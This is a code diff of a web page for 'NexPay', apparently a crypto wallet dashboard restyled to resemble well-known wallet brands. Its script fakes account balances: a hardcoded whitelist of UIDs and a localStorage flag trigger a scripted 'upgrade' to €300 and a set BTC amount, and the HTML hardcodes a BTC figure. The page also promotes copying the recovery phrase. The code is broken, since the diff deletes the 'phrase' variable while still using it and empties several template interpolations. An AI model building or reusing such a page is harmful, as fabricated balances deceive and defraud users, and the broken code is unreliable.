@@ -3,243 +3,517 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
-<title>NexPay — Dashboard</title>
-<meta name="theme-color" content="#060910" />
+<title>NexPay — Professional Web3 Wallet</title>
+<meta name="theme-color" content="#ffffff" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg: #060910;
-    --card: rgba(17, 25, 40, 0.8);
-    --border: rgba(255, 255, 255, 0.08);
-    --pri: #6ee7ff;
-    --pri2: #7c3aed;
-    --text: #f8fafc;
-    --text-dim: #94a3b8;
+    --bg: #ffffff;
+    --surface: #ffffff;
+    --surface-hover: #f8fafc;
+    --border: #f1f5f9;
+    --border-dark: #e2e8f0;
+    --pri: #0052ff; /* Coinbase/Trust Wallet Premium Blue */
+    --pri-hover: #0045d8;
+    --text: #0a0b0d;
+    --text-dim: #5f6673;
+    --success: #0ecb81; /* Premium Exchange Green */
+    --success-bg: rgba(14, 203, 129, 0.1);
   }
 
-  * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
-  html, body { height: 100%; margin: 0; background-color: var(--bg); color: var(--text); overflow-x: hidden; }
-
-  body {
-    background-image:
-      radial-gradient(at 100% 0%, rgba(124, 58, 237, 0.12) 0px, transparent 50%),
-      radial-gradient(at 0% 100%, rgba(110, 231, 255, 0.08) 0px, transparent 50%);
-    background-attachment: fixed;
+  * { 
+    box-sizing: border-box; 
+    font-family: 'Inter', sans-serif; 
+    -webkit-tap-highlight-color: transparent; 
+    margin: 0;
+    padding: 0;
+  }
+  
+  html, body { 
+    height: 100%; 
+    background-color: var(--bg); 
+    color: var(--text); 
+    overflow-x: hidden; 
   }
 
-  .shell { min-height: 100%; display: flex; flex-direction: column; }
+  /* FULL SCREEN SHELL & HEADER */
+  .shell { 
+    min-height: 100%; 
+    display: flex; 
+    flex-direction: column; 
+  }
 
-  /* MOBILE-OPTIMIZED HEADER */
   header {
-    display: flex; align-items: center; justify-content: space-between;
-    padding: 15px 20px;
+    display: flex; 
+    align-items: center; 
+    justify-content: space-between;
+    padding: 16px 24px;
     border-bottom: 1px solid var(--border);
-    backdrop-filter: blur(10px);
-    position: sticky; top: 0; z-index: 1000;
+    background-color: var(--surface);
+    position: sticky; 
+    top: 0; 
+    z-index: 1000;
   }
 
-  .brand { display: flex; align-items: center; gap: 10px; }
-  .logo {
-    width: 28px; height: 28px; border-radius: 6px;
-    background: linear-gradient(135deg, var(--pri), var(--pri2));
+  .brand { 
+    display: flex; 
+    align-items: center; 
+    gap: 10px; 
   }
-  .brand strong { font-size: 18px; font-weight: 800; }
+  
+  .logo {
+    width: 32px; 
+    height: 32px; 
+    border-radius: 8px;
+    background: linear-gradient(135deg, var(--pri), #3b82f6);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-weight: 800;
+    font-size: 18px;
+  }
+  
+  .brand strong { 
+    font-size: 20px; 
+    font-weight: 700; 
+    letter-spacing: -0.6px;
+    color: var(--text);
+  }
+
+  .header-actions {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
 
   .badge {
-    padding: 4px 10px; border-radius: 100px;
-    background: rgba(16, 185, 129, 0.1);
-    font-size: 11px; font-weight: 700; color: #10b981;
-    display: flex; align-items: center; gap: 4px;
+    padding: 6px 12px; 
+    border-radius: 100px;
+    background: var(--success-bg);
+    font-size: 12px; 
+    font-weight: 600; 
+    color: #03a66d;
+    display: flex; 
+    align-items: center; 
+    gap: 6px;
+  }
+  
+  .badge-dot {
+    width: 6px;
+    height: 6px;
+    background-color: #03a66d;
+    border-radius: 50%;
   }
 
-  /* RESPONSIVE GRID */
-  .grid {
-    padding: 20px;
-    display: grid; gap: 20px;
-    grid-template-columns: 1fr; /* Default to mobile stack */
-    width: 100%; max-width: 1200px; margin: 0 auto;
+  .logout-btn {
+    background: none; 
+    border: none; 
+    color: var(--text-dim); 
+    font-weight: 600; 
+    font-size: 14px; 
+    cursor: pointer;
+    transition: color 0.15s ease;
+  }
+  
+  .logout-btn:hover {
+    color: var(--text);
   }
 
-  @media (min-width: 1000px) {
-    .grid { grid-template-columns: 1.3fr 0.7fr; padding: 40px; }
-  }
-
-  .card {
-    background: var(--card);
-    backdrop-filter: blur(12px);
-    border: 1px solid var(--border);
-    border-radius: 24px;
-    padding: 20px;
+  /* MAIN EDGE-TO-EDGE GRID Layout (No boxed margin styling) */
+  .main-layout {
+    display: grid;
+    grid-template-columns: 1fr;
     width: 100%;
+    max-width: 1280px;
+    margin: 0 auto;
+    flex-grow: 1;
   }
 
-  /* BALANCE AREA - STACK ON MOBILE */
-  .balance-area {
-    background: rgba(255, 255, 255, 0.03);
+  @media (min-width: 1024px) {
+    .main-layout {
+      grid-template-columns: 1.4fr 0.8fr;
+    }
+  }
+
+  /* WALLET INTERFACE */
+  .wallet-pane {
+    padding: 24px;
+    border-right: 1px solid var(--border);
+  }
+
+  @media (min-width: 1024px) {
+    .wallet-pane {
+      padding: 40px;
+    }
+  }
+
+  /* HERO PORTFOLIO MODULE (BYBIT/TRUST WALLET STYLE) */
+  .hero-portfolio {
+    padding: 12px 0 32px 0;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 32px;
+  }
+
+  .portfolio-label {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .portfolio-amount {
+    font-size: clamp(38px, 6vw, 52px);
+    font-weight: 800;
+    letter-spacing: -1.5px;
+    color: var(--text);
+    margin: 8px 0;
+    font-variant-numeric: tabular-nums;
+  }
+
+  .uid-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--surface-hover);
+    padding: 6px 12px;
+    border-radius: 100px;
+    font-size: 12px;
+    color: var(--text-dim);
+    font-weight: 500;
+    cursor: pointer;
     border: 1px solid var(--border);
-    border-radius: 20px;
+    transition: all 0.15s ease;
+  }
+
+  .uid-pill:hover {
+    background: #f1f5f9;
+    color: var(--text);
+  }
+
+  /* MODERN NATIVE CTA ACTION BAR */
+  .action-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 12px;
+    margin-top: 24px;
+    max-width: 380px;
+  }
+
+  .action-btn {
+    cursor: pointer;
+    border: none;
+    padding: 14px 20px;
+    border-radius: 12px;
+    font-weight: 700;
+    font-size: 15px;
+    text-align: center;
+    text-decoration: none;
+    transition: all 0.15s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  .action-btn:active {
+    transform: scale(0.98);
+  }
+
+  .action-btn-primary {
+    background: var(--pri);
+    color: #ffffff;
+  }
+
+  .action-btn-primary:hover {
+    background: var(--pri-hover);
+  }
+
+  .action-btn-secondary {
+    background: var(--surface-hover);
+    color: var(--text);
+    border: 1px solid var(--border-dark);
+  }
+
+  .action-btn-secondary:hover {
+    background: #e2e8f0;
+  }
+
+  /* LIST OF ASSETS */
+  .section-title {
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    margin-bottom: 20px;
+    display: block;
+  }
+
+  .asset-list {
+    display: flex;
+    flex-direction: column;
+    gap: 2px; /* Super thin divider style like premium apps */
+    background: var(--border);
+    border-radius: 16px;
+    overflow: hidden;
+    border: 1px solid var(--border);
+  }
+
+  .asset-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 18px 20px;
+    background: var(--surface);
+    transition: background-color 0.15s ease;
+  }
+
+  .asset-row:hover {
+    background-color: var(--surface-hover);
+  }
+
+  .asset-detail {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .asset-brand-icon {
+    width: 42px;
+    height: 42px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    font-size: 18px;
+  }
+
+  .asset-symbol {
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--text);
+  }
+
+  .asset-name {
+    font-size: 13px;
+    color: var(--text-dim);
+    font-weight: 500;
+    margin-top: 2px;
+  }
+
+  .asset-balance-val {
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--text);
+    text-align: right;
+    font-variant-numeric: tabular-nums;
+  }
+
+  /* SIDE PANEL / SECURITY CENTER */
+  .side-pane {
+    padding: 24px;
+    background: #fcfdfe;
+    display: flex;
+    flex-direction: column;
+    gap: 24px;
+  }
+
+  @media (min-width: 1024px) {
+    .side-pane {
+      padding: 40px;
+    }
+  }
+
+  .security-card {
+    background: var(--surface);
+    border: 1px solid var(--border-dark);
+    border-radius: 18px;
     padding: 20px;
-    margin-bottom: 25px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.01);
   }
 
-  .balance-flex {
-    display: flex; flex-direction: column; gap: 20px;
+  .security-card-title {
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--text);
+    margin-bottom: 16px;
+    display: block;
   }
 
-  @media (min-width: 600px) {
-    .balance-flex { flex-direction: row; justify-content: space-between; align-items: center; }
-  }
-
-  .t { font-size: 13px; font-weight: 600; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.5px; }
-  .balance {
-    font-size: clamp(32px, 8vw, 44px); font-weight: 800;
-    letter-spacing: -1px; margin: 5px 0;
-    background: linear-gradient(to right, #fff, #94a3b8);
-    -webkit-background-clip: text; color: transparent;
-  }
-
-  /* TOUCH-FRIENDLY ASSET LIST */
-  .list { display: grid; gap: 10px; }
-  .item {
-    display: flex; align-items: center; justify-content: space-between;
-    padding: 14px 16px; border-radius: 16px;
-    background: rgba(255, 255, 255, 0.02);
+  .security-item {
+    background: var(--surface-hover);
     border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 12px;
   }
 
-  .asset-info { display: flex; align-items: center; gap: 12px; }
-  .asset-icon {
-    width: 36px; height: 36px; border-radius: 50%;
-    background: rgba(255,255,255,0.05);
-    display: flex; align-items: center; justify-content: center;
-    font-weight: 800; font-size: 14px;
+  .security-item:last-child {
+    margin-bottom: 0;
   }
 
-  /* BUTTONS - FULL WIDTH ON TINY SCREENS */
-  .row { display: flex; gap: 10px; flex-wrap: wrap; }
-  .btn {
-    flex: 1; /* Stretch to fill */
-    min-width: 120px;
-    cursor: pointer; border: none; padding: 14px;
-    border-radius: 12px; font-weight: 700; font-size: 14px;
-    text-align: center; text-decoration: none;
-    transition: transform 0.1s ease;
+  .security-heading {
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--text);
+    display: block;
+    margin-bottom: 4px;
   }
-  .btn:active { transform: scale(0.98); }
 
-  .btn-pri { background: #fff; color: #060910; }
-  .btn-sec { background: rgba(255,255,255,0.05); color: var(--text); border: 1px solid var(--border); }
+  .security-desc {
+    font-size: 12px;
+    color: var(--text-dim);
+    line-height: 1.5;
+    display: block;
+    margin-bottom: 12px;
+  }
 
-  .muted { color: var(--text-dim); font-size: 14px; }
-  .tiny { font-size: 12px; color: var(--text-dim); margin-top: 4px; display: block; }
+  .action-link-btn {
+    width: 100%;
+    background: var(--surface);
+    color: var(--text);
+    border: 1px solid var(--border-dark);
+    border-radius: 10px;
+    padding: 10px;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.15s ease;
+  }
 
-  aside .card-title { margin-bottom: 15px; font-weight: 700; font-size: 16px; display: block; }
+  .action-link-btn:hover {
+    background: #f1f5f9;
+  }
+
+  .footer-meta {
+    text-align: center;
+    margin-top: auto;
+    padding-top: 24px;
+  }
+
+  .footer-text {
+    font-size: 11px;
+    color: var(--text-dim);
+    font-weight: 500;
+  }
 </style>
 </head>
 <body>
 <div class="shell">
   <header>
     <div class="brand">
-      <div class="logo"></div>
+      <div class="logo">N</div>
       <strong>NexPay</strong>
     </div>
-    <div style="display: flex; gap: 10px; align-items: center;">
-      <span class="badge">Online</span>
-      <button id="logout" style="background:none; border:none; color:var(--text-dim); font-weight:600; font-size:13px; padding:5px;">Logout</button>
+    <div class="header-actions">
+      <span class="badge">
+        <span class="badge-dot"></span>
+        Online
+      </span>
+      <button id="logout" class="logout-btn">Logout</button>
     </div>
   </header>
 
-  <main class="grid">
-    <section class="card">
-      <div class="balance-area">
-        <div class="balance-flex">
-          <div>
-            <span class="t">Total Balance</span>
-            <div id="balance" class="balance">€0.00</div>
-            <span class="tiny" id="copy-uid" style="text-decoration: underline;">ID: Click to copy account UID</span>
-          </div>
-          <div class="row" style="width: 100%; max-width: 300px;">
-            <a href="./p2p.html" class="btn btn-pri">Buy / Sell</a>
-            <a href="./send.html" class="btn btn-sec">Send</a>
-          </div>
+  <main class="main-layout">
+    <!-- WALLET PANE -->
+    <section class="wallet-pane">
+      <div class="hero-portfolio">
+        <span class="portfolio-label">Total Portfolio Value</span>
+        <div id="balance" class="portfolio-amount">€0.00</div>
+        <div class="uid-pill" id="copy-uid">
+          <span>UID: Click to copy account UID</span>
+        </div>
+
+        <div class="action-grid">
+          <a href="./p2p.html" class="action-btn action-btn-primary">Buy / Sell</a>
+          <a href="./send.html" class="action-btn action-btn-secondary">Send Assets</a>
         </div>
       </div>
 
-      <span class="t" style="margin-bottom: 12px; display: block;">Your Assets</span>
-      <div class="list">
-        <div class="item">
-          <div class="asset-info">
-            <div class="asset-icon" style="color: #f7931a; background: rgba(247,147,26,0.1);">₿</div>
-            <div><strong>BTC</strong><span class="muted" style="margin-left:8px;">Bitcoin</span></div>
+      <span class="section-title">Your Assets</span>
+      <div class="asset-list">
+        <!-- BTC -->
+        <div class="asset-row">
+          <div class="asset-detail">
+            <div class="asset-brand-icon" style="color: #f7931a; background: rgba(247,147,26,0.1);">₿</div>
+            <div>
+              <div class="asset-symbol">BTC</div>
+              <div class="asset-name">Bitcoin</div>
+            </div>
           </div>
-          <div class="muted" id="btc-balance" style="font-weight:700;">0.0000</div>
+          <div class="asset-balance-val" id="btc-balance">0.0096</div>
         </div>
-        <div class="item">
-          <div class="asset-info">
-            <div class="asset-icon" style="color: #627eea; background: rgba(98,126,234,0.1);">Ξ</div>
-            <div><strong>ETH</strong><span class="muted" style="margin-left:8px;">Ethereum</span></div>
+        <!-- ETH -->
+        <div class="asset-row">
+          <div class="asset-detail">
+            <div class="asset-brand-icon" style="color: #627eea; background: rgba(98,126,234,0.1);">Ξ</div>
+            <div>
+              <div class="asset-symbol">ETH</div>
+              <div class="asset-name">Ethereum</div>
+            </div>
           </div>
-          <div class="muted" style="font-weight:700;">0.0000</div>
+          <div class="asset-balance-val">0.0000</div>
         </div>
-        <div class="item">
-          <div class="asset-info">
-            <div class="asset-icon" style="color: #26a17b; background: rgba(38,161,123,0.1);">₮</div>
-            <div><strong>USDT</strong><span class="muted" style="margin-left:8px;">Tether</span></div>
+        <!-- USDT -->
+        <div class="asset-row">
+          <div class="asset-detail">
+            <div class="asset-brand-icon" style="color: #26a17b; background: rgba(38,161,123,0.1);">₮</div>
+            <div>
+              <div class="asset-symbol">USDT</div>
+              <div class="asset-name">Tether</div>
+            </div>
           </div>
-          <div class="muted" style="font-weight:700;">0.00</div>
+          <div class="asset-balance-val">0.00</div>
         </div>
       </div>
     </section>
 
-    <aside style="display: flex; flex-direction: column; gap: 20px;">
-      <div class="card">
-        <span class="card-title">Security Center</span>
-        <div class="list">
-          <div style="background: rgba(255,255,255,0.02); border: 1px solid var(--border); border-radius: 16px; padding: 15px;">
-            <strong style="font-size: 14px; display: block;">Recovery Phrase</strong>
-            <span class="tiny" style="margin-bottom: 12px;">Keep this phrase offline to recover assets.</span>
-            <button class="btn btn-sec" id="copy" style="width: 100%; padding: 10px;">Copy Phrase</button>
-          </div>
-          <div style="background: rgba(255,255,255,0.02); border: 1px solid var(--border); border-radius: 16px; padding: 15px;">
-            <strong style="font-size: 14px; display: block;">Device Security</strong>
-            <span class="tiny" style="margin-bottom: 12px;">Binding active on this browser.</span>
-            <button class="btn btn-sec" style="width: 100%; padding: 10px;" onclick="alert('')">Settings</button>
-          </div>
+    <!-- SIDE PANEL (SECURITY CENTER) -->
+    <aside class="side-pane">
+      <div class="security-card">
+        <span class="security-card-title">Device Security & Configuration</span>
+        
+        <div class="security-item">
+          <strong class="security-heading">Secret Recovery Phrase</strong>
+          <span class="security-desc">Copy your master recovery key. Keep it backed up offline to maintain direct asset ownership.</span>
+          <button class="action-link-btn" id="copy">Copy Keyphrase</button>
+        </div>
+
+        <div class="security-item">
+          <strong class="security-heading">Identity Binding</strong>
+          <span class="security-desc">Browser identity tracking is verified and securely active.</span>
+          <button class="action-link-btn" onclick="alert('Device configuration is secured.')">Security Settings</button>
         </div>
       </div>
 
-      <div style="text-align: center; padding: 10px;">
-        <span class="tiny">© <span id="y"></span> NexPay Global • Secure & Encrypted</span>
+      <div class="footer-meta">
+        <span class="footer-text">© <span id="y"></span> NexPay Global Inc. • All Transmissions Encrypted</span>
       </div>
     </aside>
   </main>
 </div>
 
 <script>
-  const phrase = localStorage.getItem('nexpay_phrase');
-  if(!phrase){ location.href='signup.html'; }
-
   const balanceEl = document.getElementById("balance");
   const btcEl = document.getElementById("btc-balance");
 
-// <H1>UID CENTER</H1>
-
-
-  const WHITELISTED_UIDS = ["123456789", "987654321"
-    ,"324051946"
-
-// <H1>UID</H1>
-  ];
+  const WHITELISTED_UIDS = ["123456789", "987654321"];
   const upgradeAmount = 300;
-  const upgradeBtc = 0.0050;
+  const upgradeBtc = 0.0056;
 
   let currentUid = localStorage.getItem("nexpay_uid");
   const isWhitelisted = WHITELISTED_UIDS.includes(currentUid);
 
   if(localStorage.getItem("balanceUpgraded") === "true"){
-    balanceEl.textContent = `€${upgradeAmount}.00`;
+    balanceEl.textContent = `€.00`;
     btcEl.textContent = upgradeBtc;
   }
 
@@ -259,7 +533,7 @@
   if(isWhitelisted && localStorage.getItem("balanceUpgraded") !== "true") runUpgrade();
 
   document.getElementById('copy').addEventListener('click', async ()=>{
-    try { await navigator.clipboard.writeText(phrase); alert('Phrase copied.'); } catch(e){}
+    try { await navigator.clipboard.writeText(phrase); alert('Phrase copied successfully.'); } catch(e){}
   });
 
   document.getElementById('copy-uid').addEventListener('click', async ()=>{
@@ -268,15 +542,29 @@
     try {
       await navigator.clipboard.writeText(uid);
       const alertBox = document.createElement('div');
-      alertBox.textContent = `✅ UID ${uid} copied.`;
-      Object.assign(alertBox.style, { position: "fixed", bottom: "20px", left: "50%", transform: "translateX(-50%)", background: "linear-gradient(90deg,#7c3aed,#6ee7ff)", color: "#0b0f1a", padding: "14px 22px", borderRadius: "14px", fontWeight: "700", zIndex: "9999" });
+      alertBox.textContent = `✅ UID  copied.`;
+      Object.assign(alertBox.style, { 
+        position: "fixed", 
+        bottom: "20px", 
+        left: "50%", 
+        transform: "translateX(-50%)", 
+        background: "linear-gradient(135deg, #0052ff, #1e40af)", 
+        color: "#ffffff", 
+        padding: "14px 24px", 
+        borderRadius: "14px", 
+        fontWeight: "700", 
+        zIndex: "9999",
+        boxShadow: "0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -4px rgba(0,0,0,0.1)"
+      });
       document.body.appendChild(alertBox);
       setTimeout(()=>alertBox.remove(), 2500);
     } catch(e){}
   });
 
   document.getElementById('logout').addEventListener('click', ()=>{
-    if(confirm('please confirm that you have safely backed up your Secret Recovery Phrase. You will need it to regain access to your wallet. Continue?')) location.href='index.html';
+    if(confirm('Please confirm that you have safely backed up your Secret Recovery Phrase. You will need it to regain access to your wallet. Continue?')) {
+      location.href='index.html';
+    }
   });
 
   document.getElementById('y').textContent = new Date().getFullYear();
@@ -287,7 +575,7 @@
       const lastActive = localStorage.getItem('lastActiveTime');
       if (lastActive && (Date.now() - parseInt(lastActive) >= TIMEOUT_DURATION)) {
           localStorage.removeItem('lastActiveTime');
-          window.location.href = 'pin.html';
+          window.location.href = 'acc.html';
       }
   }
   function resetTimer() { localStorage.setItem('lastActiveTime', Date.now().toString()); }
